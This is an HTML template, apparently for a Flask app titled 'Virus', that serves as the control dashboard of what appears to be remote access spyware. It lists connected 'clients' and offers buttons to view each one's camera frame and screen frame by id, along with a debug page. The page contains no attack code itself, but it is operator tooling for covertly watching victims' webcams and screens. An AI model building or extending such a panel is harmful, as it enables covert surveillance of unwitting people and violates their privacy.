<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Virus</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    </head>
    <body>
        <h1>Hi there! There are {{ Maxclients }} clients</h1>
        <h2>Some pages:</h2>
        <a href="client">
            <button>View how many clients there are</button>
        </a>
        <a href="debug">
            <button>View debug page</button>
        </a>
        <a href="get_camera_frame?id=EnterId">
            <button>Get only client camera (you need to enter client id in url)</button>
        </a>
        <a href="get_screen_frame?id=EnterId">
            <button>Get only client screen (you need to enter client id in url)</button>
        </a>
        <h2>Clients:</h2>

        {% for client in clients.values() %}
            <a href="client/{{ client.clientId }}">
                <button>Client {{ client.clientId }}</button>
            </a>
        {% endfor %}


        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    </body>
</html>
